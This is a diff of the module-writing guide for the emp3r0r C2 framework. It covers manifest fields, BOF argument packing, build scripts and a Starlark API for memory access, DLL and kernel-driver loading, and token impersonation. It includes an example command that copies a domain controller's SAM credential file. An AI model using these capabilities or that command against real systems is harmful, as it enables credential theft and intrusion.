@@ -1,594 +1,452 @@
-# emp3r0r Module Development Guide
+# Writing emp3r0r Modules
 
-This guide details the end-to-end process of creating, configuring, and building new modules for emp3r0r. Currently, emp3r0r officially supports **BOF (COFF)** and **Starlark** modules.
+Modules extend the emp3r0r C2 with new commands. A module is a directory
+containing a `config.json` manifest plus its payload sources. The C2 reads
+every manifest at startup, registers each entry as a console command, and the
+agent runs the payload in memory.
+
+There are two kinds of modules:
+
+- **Agent modules** run on the target. Their payload is one of:
+  - `coff` — a Windows COFF or Linux relocatable object (BOF),
+  - `starlark` — a script run by the embedded Starlark engine,
+  - `dll` — a Windows DLL called in memory, or
+  - `bash`, `python`, `powershell` — scripts run through the agent's script
+    runner. These cannot impersonate tokens; prefer `starlark` for that.
+- **C2 modules** (`"is_local": true`) run on the operator machine. They extend
+  the console itself — `loader_windows` builds a loader on the C2,
+  `crystal_pack` turns a DLL into PIC shellcode, and so on.
 
 ---
 
-## 1. Directory Structure
+## 1. Directory layout
 
-All custom modules reside inside the `core/modules/` directory. You can organize your modules in two ways:
-
-1. **Standalone Module:** A single folder for a specific module (e.g., `core/modules/process_list_handles/`).
-2. **Module Suite:** A folder containing a collection of related modules defined in a single configuration (e.g., `core/modules/Remote-OPs/` or `core/modules/SA/`).
-
-A standard module suite repository looks like this:
+Modules live under `core/modules/`. A module can be standalone:
 
 ```text
-core/modules/MyModuleSuite/
-├── config.json         # Mandatory: The JSON registry defining the modules
-├── make_all.sh         # Optional: Executed automatically by build.sh
-├── src/                # Your C/C++ or Starlark source code
-│   └── MyBof/
-│       ├── bof.c
-│       └── Makefile
+core/modules/hello_linux/
+├── config.json
+├── Makefile
+└── hello_linux.c
 ```
+
+or a suite of related modules sharing one manifest and source tree:
+
+```text
+core/modules/SA/
+├── config.json
+├── Makefile
+├── whoami.star
+├── uptime.star
+└── ...
+```
+
+The shared headers and helpers used by many modules live in
+`core/modules/bof_common/` (BOF headers) and `core/modules/common/`
+(cross-platform C sources such as RC4 and the indirect-syscall stubs). The C2
+copies both into the operator workspace so module build scripts can reference
+them by relative path.
 
 ---
 
-## 2. The `config.json` Format
+## 2. `config.json`
 
-The `config.json` file is the heart of your module. It is a JSON array containing one or more module definitions. The C2 parses this file (via `readModConfigs` in `modcustom.go`) to dynamically register the commands, their help menus, and their execution payloads.
-
-### Example Configuration (BOF)
-
-See `core/modules/hello_linux/config.json` for a real-world example:
+A manifest is either a single module object or an array of objects. All fields
+except `name` may be omitted; sensible defaults are supplied.
 
 ```json
-[
-  {
-    "name": "hello_linux",
-    "build": "make",
-    "author": "jm33-ng",
-    "date": "2026-01-26",
-    "comment": "Linux BOF Hello World",
-    "is_local": false,
-    "platform": "Linux",
-    "path": "",
-    "fileless": true,
-    "parameters": [
-      {
-        "name": "who",
-        "description": "Who to greet",
-        "default": "World",
-        "type": "cstr",
-        "required": false
-      }
-    ],
-    "agent_config": {
-      "exec": "",
-      "files": ["hello_linux.o"],
-      "in_memory": true,
-      "type": "coff",
-      "interactive": false
-    },
-    "invocation": {
-      "coff_export": "go"
+{
+  "name": "hello_linux",
+  "build": "make",
+  "author": "jm33-ng",
+  "date": "2026-01-26",
+  "comment": "Linux BOF Hello World",
+  "is_local": false,
+  "platform": "Linux",
+  "path": "",
+  "fileless": true,
+  "parameters": [
+    {
+      "name": "who",
+      "description": "Who to greet",
+      "default": "World",
+      "type": "cstr",
+      "required": false
     }
+  ],
+  "agent_config": {
+    "exec": "",
+    "files": ["hello_linux.o"],
+    "in_memory": true,
+    "type": "coff",
+    "interactive": false
+  },
+  "invocation": {
+    "coff_export": "go"
   }
-]
-```
-
-### Example Configuration (Starlark)
-
-See `core/modules/starlark_procinfo/config.json` for a real-world example:
-
-```json
-[
-  {
-    "name": "starlark_procinfo",
-    "build": "",
-    "author": "you",
-    "date": "2026-06-22",
-    "comment": "List running process info on Linux using Starlark script engine",
-    "is_local": false,
-    "platform": "Linux",
-    "path": "",
-    "fileless": true,
-    "parameters": [
-      {
-        "name": "filter",
-        "description": "Optional search filter for process name or cmdline",
-        "default": "",
-        "type": "string",
-        "required": false
-      }
-    ],
-    "agent_config": {
-      "exec": "run.star",
-      "files": ["run.star"],
-      "in_memory": true,
-      "type": "starlark",
-      "interactive": false
-    },
-    "invocation": {}
-  }
-]
-```
-
-### Minimal Source Code Examples
-
-#### BOF Source (`core/modules/hello_linux/hello_linux.c`)
-
-```c
-#include "beacon_helpers.h"
-#include "syscall_helpers.h"
-
-// Declare BeaconPrintf
-extern void BeaconPrintf(int type, const char *fmt, ...);
-
-void go(char *args, int len) {
-  datap parser;
-  BeaconDataParse(&parser, args, len);
-
-  char *who = BeaconDataString(&parser);
-  if (!who || !who[0]) {
-    who = "World";
-  }
-
-  BeaconPrintf(0, "Hello %s!", who);
 }
 ```
 
-#### Starlark Source (`core/modules/starlark_procinfo/run.star`)
+### Top-level fields
 
-```python
-CAPABILITIES = [
-    "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
-    "CAP_FSETID", "CAP_KILL", "CAP_SETGID", "CAP_SETUID", "CAP_SETPCAP",
-    "CAP_LINUX_IMMUTABLE", "CAP_NET_BIND_SERVICE", "CAP_NET_BROADCAST",
-    "CAP_NET_ADMIN", "CAP_NET_RAW", "CAP_IPC_LOCK", "CAP_IPC_OWNER",
-    "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT", "CAP_SYS_PTRACE",
-    "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_NICE",
-    "CAP_SYS_RESOURCE", "CAP_SYS_TIME", "CAP_SYS_TTY_CONFIG", "CAP_MKNOD",
-    "CAP_LEASE", "CAP_AUDIT_WRITE", "CAP_AUDIT_CONTROL", "CAP_SETFCAP",
-    "CAP_MAC_OVERRIDE", "CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM",
-    "CAP_BLOCK_SUSPEND", "CAP_AUDIT_READ", "CAP_PERFMON", "CAP_BPF",
-    "CAP_CHECKPOINT_RESTORE"
-]
+| Field | Meaning |
+| --- | --- |
+| `name` | Command name registered in the console. Must be unique. |
+| `comment` | One-line description shown in help and agent output. |
+| `author`, `date` | Metadata only. |
+| `is_local` | `true` runs the module on the C2 instead of the target. |
+| `platform` | `Linux`, `Windows`, or empty for cross-platform. Used for help and dependency wiring. |
+| `path` | Filled in by the C2 with the module's working copy. Leave empty. |
+| `fileless` | Informational flag for in-memory execution. |
+| `build` | Command the C2 runs before the module executes, with the current flags appended (`--flag value`). Used by buildable and local modules, e.g. `bash ./build.sh`. |
+| `dependencies` | Module names that must be loadable before this one runs. Windows BOFs get `coffloader` added automatically. |
+| `module_files_memfs` | Upload every file in `agent_config.files` to encrypted memfs before the module runs. |
+| `parameters` | The command's options (see below). |
+| `agent_config` | How the payload is executed. |
+| `invocation` | How options are turned into argv/BOF arguments. |
 
-def decode_caps(hex_str):
-    if not hex_str or hex_str == "N/A":
-        return "N/A"
-    val = int(hex_str, 16)
-    if val == 0:
-        return "None"
-    caps = []
-    for i in range(len(CAPABILITIES)):
-        if (val & (1 << i)) != 0:
-            caps.append(CAPABILITIES[i])
-    if not caps:
-        return hex_str
-    return ", ".join(caps)
+### `agent_config`
 
-def parse_status(status_text):
-    info = {}
-    for line in status_text.split('\n'):
-        if not line:
-            continue
-        parts = line.split(':\t')
-        if len(parts) == 2:
-            key = parts[0].strip()
-            val = parts[1].strip()
-            info[key] = val
-    return info
+| Field | Meaning |
+| --- | --- |
+| `type` | `coff`, `starlark`, `dll`, `bash`, `python`, or `powershell`. |
+| `files` | Payload files, relative to the module directory. BOFs list both `.x64.o` and `.x86.o` and the agent picks by architecture. For Starlark, `files[0]` is the entry script and the rest are companion files. |
+| `in_memory` | Run without writing to disk. Almost always `true`. |
+| `exec` | Entry script for script modules (`run.star`); empty for BOFs. |
+| `interactive` | The module starts an interactive session (echo handshake before SSH). |
+| `work_dir` | Optional working directory on the target. |
+| `needs_root` | The C2 refuses to run the module unless the agent is root/SYSTEM. |
 
-def format_ns(ns_ls_output):
-    ns_dict = {}
-    for line in ns_ls_output.split('\n'):
-        if " -> " in line:
-            parts = line.split(" -> ")
-            if len(parts) == 2:
-                name = parts[0].split(" ")[-1]
-                target = parts[1].strip()
-                ns_dict[name] = target
-    return ns_dict
+### `parameters`
 
-def main(*args):
-    print("==================================================")
-    print(" Current Process Info ")
-    print("==================================================")
+Each parameter becomes a `--flag` on the generated console command. Fields:
 
-    cmdline = read_file("/proc/self/cmdline").strip("\x00").replace("\x00", " ")
-    print("Cmdline:    %s" % (cmdline or "N/A"))
+| Field | Meaning |
+| --- | --- |
+| `name` | Flag name, used as `--name value`. |
+| `description` | Help text. Required for every parameter. |
+| `default` | Value used when the operator omits the flag. |
+| `type` | Value type; also selects the COFF wire format (see §3). |
+| `required` | Reject the invocation when the value is empty. |
+| `choices` | Restrict the value to one of a fixed list. |
+| `pattern` | Regex the value must match. |
+| `min`, `max` | Numeric bounds for `int`/`short` types. |
+| `secret` | Hide the value in help output. |
+| `encoding` | Optional transport encoding for the value. |
+| `argv_flag` | Prefix inserted before the value when building argv, e.g. `--user`. |
 
-    status_text = read_file("/proc/self/status")
-    status = parse_status(status_text)
+Avoid `force` and `help` as parameter names: they collide with the built-in
+console flags.
 
-    print("\n--- Identity & Privileges ---")
-    print("Name:       %s" % status.get("Name", "N/A"))
-    print("State:      %s" % status.get("State", "N/A"))
-    print("PID:        %s" % status.get("Pid", "N/A"))
-    print("PPID:       %s" % status.get("PPid", "N/A"))
-    print("UIDs:       %s (Real, Effective, Saved, FS)" % status.get("Uid", "N/A"))
-    print("GIDs:       %s (Real, Effective, Saved, FS)" % status.get("Gid", "N/A"))
-    print("Groups:     %s" % status.get("Groups", "N/A"))
+### `invocation`
 
-    print("\n--- Capabilities ---")
-    print("Inheritable:\n  %s" % decode_caps(status.get("CapInh", "N/A")))
-    print("Permitted:\n  %s" % decode_caps(status.get("CapPrm", "N/A")))
-    print("Effective:\n  %s" % decode_caps(status.get("CapEff", "N/A")))
-    print("Bounding:\n  %s" % decode_caps(status.get("CapBnd", "N/A")))
-    print("Ambient:\n  %s" % decode_caps(status.get("CapAmb", "N/A")))
-    print("NoNewPrivs: %s" % status.get("NoNewPrivs", "N/A"))
-
-    print("\n--- Cgroups ---")
-    cgroup_text = read_file("/proc/self/cgroup")
-    for line in cgroup_text.split('\n'):
-        if line:
-            parts = line.split(':')
-            if len(parts) >= 3:
-                print(parts[2])
-
-    print("\n--- Namespaces ---")
-    ns_info = exec_cmd("ls", ["-l", "/proc/self/ns"])
-    namespaces = format_ns(ns_info)
-    for k in sorted(namespaces.keys()):
-        k_padded = k + ":"
-        if len(k_padded) < 12:
-            k_padded = k_padded + " " * (12 - len(k_padded))
-        print("%s %s" % (k_padded, namespaces[k]))
-
-    print("\n--- Environment ---")
-    environ = read_file("/proc/self/environ")
-    env_vars = [e for e in environ.split("\x00") if e]
-    print("%d environment variables loaded." % len(env_vars))
-
-    print("==================================================")
-    return "OK"
-```
-
-### Critical Fields Explained
-
-#### `agent_config.type`
-
-Must be either `"coff"` (for BOFs) or `"starlark"`.
-
-#### `agent_config.files`
-
-An array of relative paths (relative to the directory where `config.json` lives) pointing to the compiled payloads or script files.
-
-- For BOFs, provide the `.x64.o` and `.x86.o` compiled object files. The agent will dynamically load the correct architecture file at runtime.
-- For starlark modules, `files[0]` is the entry-point script; every other entry is a **companion file** that is uploaded to the agent and cached in encrypted memfs (`memfs:///`) before the script runs. The script reads them transparently with `read_file()` and can enumerate them via the `module_files` global. This is enabled per-module by setting `"module_files_memfs": true` in the module's own `config.json` (off by default). See `core/modules/kkyum/` for an example: `kkyum.star` loads the companion kernel-driver `.sys` from memfs with `driver_load_bytes`.
-
-#### `parameters`
-
-This defines the CLI flags the operator can use (e.g. `--pid 1234`).
-**CRITICAL:** For BOF modules, the `type` field dictates exactly how the C2 packs the arguments into the wire format before sending them to the agent! Based on the C2 parser in `modcustom.go` (`typeToWireToken`), you **must** strictly use one of the following aliases:
-
-- `"int"` (or `"uint32"`, `"dword"`): Packed as a 32-bit integer (`'i'`).
-- `"short"` (or `"word"`, `"int16"`): Packed as a 16-bit short (`'s'`).
-- `"cstr"` (or `"string"`): Packed as a UTF-8 C-String (`'z'`).
-- `"wstr"` (or `"wstring"`): Packed as a UTF-16LE Wide String (`'Z'`).
-- `"binary"` (or `"base64"`, `"b"`): Packed as a length-prefixed binary blob (`'b'`).
-
-_Note: Never use arbitrary strings like `"integer"` or `"file"`, as the COFF packer will fail to identify the type and abort the execution._
-_Note 2: Do not use reserved flags like `"force"` or `"help"` as parameter names, as they conflict with internal Cobra CLI flags._
+| Field | Meaning |
+| --- | --- |
+| `argv` | Literal tokens prepended to the argument list, e.g. `[{"literal": "download"}]` for a script that dispatches on its first argument. Parameters are appended after these in declaration order. |
+| `coff_export` | BOF entry point. Use `go` for Beacon-compatible BOFs. |
+| `stdin_param` | Parameter whose value is piped to the child process's stdin. |
+| `timeout_seconds` | Kill the module after this many seconds. |
+| `dll_export`, `dll_entry`, `dll_file_param` | DLL-only fields. Defaults match the standard in-memory DLL loader (`LoadAndRun`, `go`, `file`). |
 
 ---
 
-## 3. Build Automation (`make_all.sh`)
+## 3. Parameter types and BOF wire format
 
-emp3r0r features a dynamic, generic build system. You **do not** need to edit `core/build.sh` when adding a new module suite.
+The `type` field is the single source of truth for both validation on the C2
+and argument packing on the agent. BOF parameters are packed in declaration
+order using the COFFLoader convention.
 
-If your module requires compilation (e.g., compiling C code to BOF `.o` files), simply create an executable bash script named `make_all.sh` at the root of your module directory:
+| Type value | Wire format | Packed as |
+| --- | --- | --- |
+| `int`, `uint32`, `int32`, `uint`, `dword`, `port`, `bool` | `i` | 32-bit integer |
+| `short`, `int16`, `word` | `s` | 16-bit integer |
+| `cstr`, `string`, `str`, `lpstr` | `z` | UTF-8 C string |
+| `wstr`, `wstring`, `lpwstr`, `w` | `Z` | UTF-16LE wide string |
+| `binary`, `base64` | `b` | Length-prefixed binary blob |
 
-`core/modules/MyModuleSuite/make_all.sh`:
+The single-character tokens `z`, `Z`, `i`, `s`, `b` are also accepted directly.
+Any other value is not recognized and the BOF argument packer will fail when
+the module runs, so stick to the table above.
+
+Notes:
+
+- Every declared BOF argument is packed even when the operator leaves it
+  empty, so the BOF always receives a well-formed argument list. Empty
+  numeric values are packed as zero.
+- `argv_flag` only affects script modules and non-BOF invocation. For BOFs the
+  value is packed directly.
+- Starlark receives every parameter as a positional string, in order. It does
+  its own `int()`/`bool()` conversion.
+
+---
+
+## 4. Building modules
+
+The main build script (`core/build.py`) scans `core/modules/*/make_all.sh` and
+runs each one automatically. You do not need to edit `build.py` to add a
+module. A minimal build script:
+
+`core/modules/MySuite/make_all.sh`:
 
 ```bash
 #!/bin/bash
 set -e
-echo "[*] Building MyModuleSuite..."
-
-# Example: invoke Makefiles in subdirectories
-make -C src/MyBof -j$(nproc)
+make -C src/MyBof -j"$(nproc)"
 ```
 
-Ensure the script is executable (`chmod +x make_all.sh`). During the global compilation process (`./core/build.sh`), the main script will automatically detect any `make_all.sh` files in the `core/modules/*` directories and execute them seamlessly.
+Keep compiled artifacts in the source tree and reference them by relative path
+in `agent_config.files`. Do not copy them elsewhere.
 
-_(Remember: Keep compiled `.o` files in their respective source directories. Do not copy them out of the source tree; simply reference their relative paths in `config.json`'s `files` array!)_
+`make_all.sh` is only for suites that need compiling ahead of time. A
+single-file Starlark module needs no build step at all.
+
+The `build` field is separate: it is a command
+the C2 runs immediately before each execution, with the current flags
+appended. `loader_windows` uses `"build": "bash ./build.sh"` for this.
+
+Toolchain requirements for the C modules are documented in each module's
+README. The Windows loader, for example, needs zig (installed by `build.py`),
+`nasm`, and a native C compiler.
 
 ---
 
-## 4. How the C2 Loads Your Module
+## 5. How modules become commands
 
-When the emp3r0r C2 starts, it parses the modules via `InitModules` in `core/internal/cc/modules/modcustom.go`:
+At startup the C2 scans the module directories (the install prefix first, then
+the operator workspace, with later directories overriding earlier ones). For
+every valid manifest it:
 
-1. **Discovery:** Scans `modules/*` directories for `config.json` files.
-2. **Validation:** Unmarshals the JSON. If there are duplicate parameter names, reserved flags (`force`, `help`), or schema errors, it throws a warning and skips the module.
-3. **Registration:** Stores the valid module into the `def.Modules` memory map.
-4. **Execution:** Each registered module becomes its **own top-level console command** (see `addModuleCommands` in `core/internal/cc/operator/mod_cmd.go`), with one `--flag` per parameter, e.g. `sa_whoami --pid 1234`, `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest memfs:///SAM --token <SID>`. Flag defaults come from `config.json`; values are read per-invocation and never written back into the shared config.
+1. builds a local module if it declares `build`, and copies buildable sources
+   into the operator workspace;
+2. creates a top-level console command named after the module, with one flag
+   per parameter;
+3. stores the module for later lookup. Invalid manifests are reported and
+   skipped rather than half-registered.
 
-> ⚠️ **There is no `use` / `set` / `run` module console anymore** (removed long ago). Do not document operators typing `use <module>`, `set <option> <value>`, or a bare `run`. Any doc, comment, `usage()` text or example that shows that flow is stale — rewrite it as `module_name --option value ...`.
+There is no `use` / `set` / `run` module console. Invoke a module directly:
 
-_Note: For BOFs, only the arch-matching file from the `files` list is executed (e.g. only the `.x64.o` when the target is amd64). For starlark modules, `files[0]` is the entry point and the rest are memfs companion files (see `agent_config.files` above)._
+```text
+sa_whoami --pid 1234
+cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
+  --dest memfs:///SAM --token <SID>
+```
 
 ---
 
-## 5. Starlark Module Scripting & API Reference
+## 6. Writing Starlark modules
 
-emp3r0r includes a high-performance, embedded Starlark script engine for cross-platform and Windows/Linux native system scripting.
+Starlark is a small, deterministic Python dialect. The agent embeds the
+engine, so scripts run with no interpreter on the target.
 
-### Critical Rules & Differences from Python
+### Rules of the language
 
-> [!IMPORTANT]
-> **Starlark is NOT Python!**
->
-> - Starlark does **not** have Python's standard library (do not `import sys`, `import re`, `import math`, etc.).
-> - Standard Python functions like `hex()` or advanced `%016x`, `%-30s` format specifiers in `%` string formatting are **not** built into standard Starlark.
-> - **Use the Go-Native APIs**: Use the native built-in APIs provided by the engine (`sprintf`, `hex`, `read_uint32`, `read_wstring`, `utf16_ptr`, `str_split`, etc.) for maximum performance and safety.
+- **It is not Python.** There is no standard library: `import sys`, `re`,
+  `os`, and friends do not exist.
+- Integer formatting helpers such as `hex()` and the full `%` formatting
+  specifier set are provided as built-ins, not language features.
+- Use the built-ins below for memory access and string work; they are faster
+  and safer than doing it by hand.
 
-### Starlark Built-in API Reference
+### Built-in API
 
-#### A. String Formatting & Manipulation
+#### Strings
 
-| API Function                      | Parameters               | Description                                                                                      |
-| :-------------------------------- | :----------------------- | :----------------------------------------------------------------------------------------------- |
-| `sprintf`                         | `(format_string, *args)` | Formats a string using Go `fmt.Sprintf` format specifiers (`%016x`, `%02d`, `%-30s`, `%+03d`).   |
-| `hex`                             | `(val)`                  | Converts an integer value to a `0x...` hexadecimal string.                                       |
-| `str_split`                       | `(s, sep)`               | Splits string `s` by separator `sep` into a list of strings.                                     |
-| `str_join`                        | `(elements, sep)`        | Joins an iterable list/tuple of strings with separator `sep`.                                    |
-| `str_replace`                     | `(s, old, new, n=-1)`    | Replaces occurrences of `old` with `new` in string `s`.                                          |
-| `str_contains`                    | `(s, substr)`            | Returns `True` if `substr` is inside `s`, `False` otherwise.                                     |
-| `str_trim`                        | `(s, cutset="")`         | Trims leading and trailing whitespace or characters in `cutset`.                                 |
-| `str_lower` / `str_upper`         | `(s)`                    | Returns lowercase or uppercase representation of string `s`.                                     |
-| `str_startswith` / `str_endswith` | `(s, prefix/suffix)`     | Returns `True` if string `s` starts with `prefix` or ends with `suffix`.                         |
-| `str_pad` / `pad`                 | `(text, width)`          | Pads `text` to specified column width (right-padded if `width > 0`, left-padded if `width < 0`). |
-| `str_index`                       | `(s, substr)`            | Returns the zero-based index of `substr` in `s`, or `-1` if not found.                           |
+| Function | Description |
+| --- | --- |
+| `sprintf(format, *args)` | `fmt.Sprintf` formatting (`%016x`, `%-30s`, ...). |
+| `hex(value)` | Integer to a `0x...` string. |
+| `str_split(s, sep)` / `str_join(list, sep)` | Split and join. |
+| `str_replace(s, old, new, n=-1)` | Replace occurrences. |
+| `str_contains(s, needle)` | Substring test. |
+| `str_trim(s, cutset="")` | Trim whitespace or a character set. |
+| `str_lower(s)` / `str_upper(s)` | Case conversion. |
+| `str_startswith(s, prefix)` / `str_endswith(s, suffix)` | Prefix/suffix test. |
+| `str_pad(text, width)` / `pad(text, width)` | Pad to a column width; right for positive, left for negative. |
+| `str_index(s, needle)` | Index of a substring, or `-1`. |
 
-#### B. Memory Reading Primitives (Go Native)
+#### Files, network, and processes
 
-All memory reading primitives safely access unmanaged memory addresses across Windows and Linux processes.
+| Function | Description |
+| --- | --- |
+| `read_file(path)` / `write_file(path, content)` | Text file I/O. `memfs:///` paths go to the agent's encrypted memory filesystem. |
+| `list_dir(path)` / `exists(path)` / `mkdir(path)` / `remove(path)` | Filesystem helpers. |
+| `http_get(url)` / `http_post(url, content_type, body)` | HTTP requests returning the response body. |
+| `exec_cmd(cmd, args=[])` | Run a command and return its combined output. |
+| `crypto_hash(algo, data)` | Hash `data` with `md5`, `sha1`, or `sha256`. |
+| `bytes_to_b64(data)` / `b64_to_bytes(b64)` | Binary-safe base64 round trip. |
+| `write_bytes(path, data)` | Write binary data to a local or `memfs:///` path. |
 
-| API Function                            | Parameters           | Description                                                                                   |
-| :-------------------------------------- | :------------------- | :-------------------------------------------------------------------------------------------- |
-| `read_u8` / `read_uint8`                | `(addr, offset=0)`   | Reads 1 byte (`uint8`) from `addr + offset`.                                                  |
-| `read_u16` / `read_uint16`              | `(addr, offset=0)`   | Reads 2 bytes (`uint16`, little-endian) from `addr + offset`.                                 |
-| `read_u32` / `read_uint32`              | `(addr, offset=0)`   | Reads 4 bytes (`uint32`, little-endian) from `addr + offset`.                                 |
-| `read_u64` / `read_uint64` / `read_ptr` | `(addr, offset=0)`   | Reads 8 bytes (`uint64`/pointer, little-endian) from `addr + offset`.                         |
-| `read_i32` / `read_int32`               | `(addr, offset=0)`   | Reads signed 4 bytes (`int32`, little-endian) from `addr + offset`.                           |
-| `read_wstring`                          | `(ptr, max_len=256)` | Safely reads a null-terminated UTF-16 wide string from memory pointer into a Starlark string. |
-| `read_cstring` / `read_ansi_string`     | `(ptr, max_len=256)` | Safely reads a null-terminated C/ANSI string from memory pointer into a Starlark string.      |
+#### Memory reads
 
-#### C. Memory Writing Primitives & String Allocators
+All memory helpers take `(addr, offset=0)` and read little-endian.
 
-| API Function                               | Parameters                | Description                                                                                                         |
-| :----------------------------------------- | :------------------------ | :------------------------------------------------------------------------------------------------------------------ |
-| `write_byte` / `write_u8`                  | `(addr, [offset=0,] val)` | Writes 1 byte to target memory address `addr + offset`.                                                             |
-| `write_u16` / `write_uint16`               | `(addr, [offset=0,] val)` | Writes 2 bytes (`uint16`, little-endian) to `addr + offset`.                                                        |
-| `write_u32` / `write_uint32`               | `(addr, [offset=0,] val)` | Writes 4 bytes (`uint32`, little-endian) to `addr + offset`.                                                        |
-| `write_u64` / `write_uint64` / `write_ptr` | `(addr, [offset=0,] val)` | Writes 8 bytes (`uint64`/pointer, little-endian) to `addr + offset`.                                                |
-| `utf16_ptr`                                | `(s)`                     | Allocates unmanaged memory, encodes string `s` to UTF-16LE null-terminated, and returns memory address pointer.     |
-| `cstring_ptr` / `ansi_ptr`                 | `(s)`                     | Allocates unmanaged memory, encodes string `s` to null-terminated C/ANSI bytes, and returns memory address pointer. |
+`read_u8`/`read_uint8`, `read_u16`/`read_uint16`, `read_u32`/`read_uint32`,
+`read_u64`/`read_uint64`/`read_ptr`, `read_i32`/`read_int32`, plus the
+null-terminated string readers `read_wstring(ptr, max_len=256)` (UTF-16) and
+`read_cstring(ptr, max_len=256)` / `read_ansi_string` (C/ANSI).
 
-#### D. Windows & Linux System Interop
+#### Memory writes and allocators
 
-| API Function                                       | Parameters                    | Description                                                                                                                   |
-| :------------------------------------------------- | :---------------------------- | :---------------------------------------------------------------------------------------------------------------------------- |
-| `win_call`                                         | `(dll, function_name, *args)` | Dynamically calls an exported Windows DLL function with native parameters. Returns dict with `r1`, `r2`, `err_code`, `error`. |
-| `win_alloc` / `win_free`                           | `(size)` / `(addr)`           | Allocates / frees unmanaged memory on Windows via `VirtualAlloc`/`VirtualFree`. Passing `0` to `win_free` is safely ignored.  |
-| `win_read_mem`                                     | `(addr, size)`                | Reads raw memory byte list from Windows process memory via `ReadProcessMemory`.                                               |
-| `sys_call` / `lin_syscall` / `linux_syscall`       | `(syscall_num, *args)`        | Executes a native Linux syscall.                                                                                              |
-| `sys_alloc` / `lin_alloc` / `linux_alloc`          | `(size)`                      | Linux memory allocation via `mmap`. Returns base memory address.                                                              |
-| `sys_free` / `lin_free` / `linux_free`             | `(addr)`                      | Deallocates memory allocated on Linux.                                                                                        |
-| `sys_read_mem` / `lin_read_mem` / `linux_read_mem` | `(addr, size)`                | Reads raw memory byte list from Linux process memory.                                                                         |
+`write_byte`/`write_u8`/`write_uint8`, `write_u16`/`write_uint16`,
+`write_u32`/`write_uint32`, `write_u64`/`write_uint64`/`write_ptr` all take
+`(addr, val)` or `(addr, offset, val)`. `utf16_ptr(s)` and
+`cstring_ptr(s)`/`ansi_ptr(s)` allocate unmanaged memory holding an encoded,
+null-terminated copy of `s` and return its address.
 
-#### E. File System, Networking, Execution & Cryptography
+#### Windows interop
 
-| API Function                               | Parameters                   | Description                                                                                |
-| :----------------------------------------- | :--------------------------- | :----------------------------------------------------------------------------------------- |
-| `read_file` / `write_file`                 | `(path)` / `(path, content)` | File reading and writing.                                                                  |
-| `list_dir` / `exists` / `mkdir` / `remove` | `(path)`                     | Directory listing, existence check, directory creation, and file removal.                  |
-| `http_get`                                 | `(url)`                      | Performs HTTP GET request and returns body content string.                                 |
-| `http_post`                                | `(url, content_type, body)`  | Performs HTTP POST request and returns body content string.                                |
-| `exec_cmd`                                 | `(cmd, args=[])`             | Executes shell command with optional argument string list. Returns combined output string. |
-| `crypto_hash`                              | `(algo, data)`               | Computes hash (`"md5"`, `"sha1"`, `"sha256"`) of `data`.                                   |
-| `bytes_to_b64` / `b64_to_bytes`            | `(data)` / `(b64)`           | Binary-safe base64 round-trip for `bytes`/string values (builtins in `core/lib/script/api_bytes.go`). |
-| `write_bytes`                              | `(path, data)`               | Writes `bytes`/string binary-safely to a local or `memfs:///` path via the agent's file writer.      |
+| Function | Description |
+| --- | --- |
+| `win_call(dll, function, *args)` | Call an exported DLL function. Returns a dict with `r1`, `r2`, `err_code`, and `error`. |
+| `win_alloc(size)` / `win_free(addr)` | `VirtualAlloc`/`VirtualFree`. `win_free(0)` is a no-op. |
+| `win_read_mem(addr, size)` | Read raw bytes with `ReadProcessMemory`. |
+| `current_token()` | Handle to the current effective token (thread token first, then process token). `0` on failure. Close it with `win_call("kernel32.dll", "CloseHandle", h)`. |
 
-#### F. Predeclared Global Variables
+#### Linux syscalls
 
-- **`argv`**: List of string arguments passed to the script execution thread.
-- **`current_token`**: Returns a `HANDLE` (as integer) to the current effective token. On Windows this tries the thread token first (so impersonation is visible), then falls back to the process token. Returns `0` on failure. **The caller must close the handle** with `win_call("kernel32.dll", "CloseHandle", h)`.
+`sys_call(syscall_num, *args)`, `sys_alloc(size)`, `sys_free(addr)`,
+`sys_read_mem(addr, size)` and their `lin_*` and `linux_*` aliases.
 
----
+#### In-memory DLLs (Windows)
 
-## 6. Token Impersonation (Windows)
+| Function | Description |
+| --- | --- |
+| `mem_load_library(data)` / `mem_load(data)` | Map a DLL image into memory; returns its base address as a handle. |
+| `mem_proc_address(module, name)` | Address of a named export. |
+| `mem_proc_ordinal(module, ordinal)` | Address of an export by ordinal. |
+| `mem_base_addr(module)` | Base address of a loaded module. |
+| `mem_free(module)` | Unload a module and drop its handle. |
 
-emp3r0r supports stealing Windows access tokens from running processes and using them to impersonate users during module execution. This section explains how tokens flow through the system and how to write token-aware modules.
+#### Signed kernel drivers (Windows)
 
-### 6.1 Built-in Token Commands
+| Function | Description |
+| --- | --- |
+| `driver_load(path, name)` | Install and start a signed `.sys` from an absolute path. |
+| `driver_load_bytes(data, name)` | Drop the image to `System32\drivers`, load it, then delete the file. |
+| `driver_unload(name)` | Stop the driver and remove its service key. |
+| `driver_is_loaded(name)` | Whether the service key exists. |
+| `driver_is_signed(path)` | Offline Authenticode check with `WinVerifyTrust`. |
 
-| Command                             | Description                                                                                                                 |
-| ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
-| `steal_token --pid <PID>`          | Steal the primary token from a process and cache it. Enables `SeDebugPrivilege` and `SeImpersonatePrivilege` automatically. |
-| `list_tokens`                      | List all cached tokens (DOMAIN/User + SID), including netlogon sessions.                                                    |
-| `list_sessions`                    | List all netlogon logon sessions created by the `--user` option (see §6.8).                                                 |
+Only signed drivers are supported; no DSE bypass is attempted.
 
-Every token-aware module (starlark, COFF/BOF, DLL) automatically receives three universal parameters:
+### The `agent` module
 
-| Parameter    | Meaning                                                                                                                 |
-| ------------ | ----------------------------------------------------------------------------------------------------------------------- |
-| `--token`    | SID of a stolen token (`list_tokens`) **or** a netlogon session name (`list_sessions`) to impersonate.                  |
-| `--user`     | Create/reuse a netonly netlogon session for this user (`DOMAIN/user` or plain) and run the module under it.             |
-| `--ticket`   | Base64 KRB-CRED (.kirbi) to import into the module's logon session (the `--token`/`--user` session, or the current one). |
+Every function is available both as `agent.foo()` and as a flat `agent_foo()`
+alias:
 
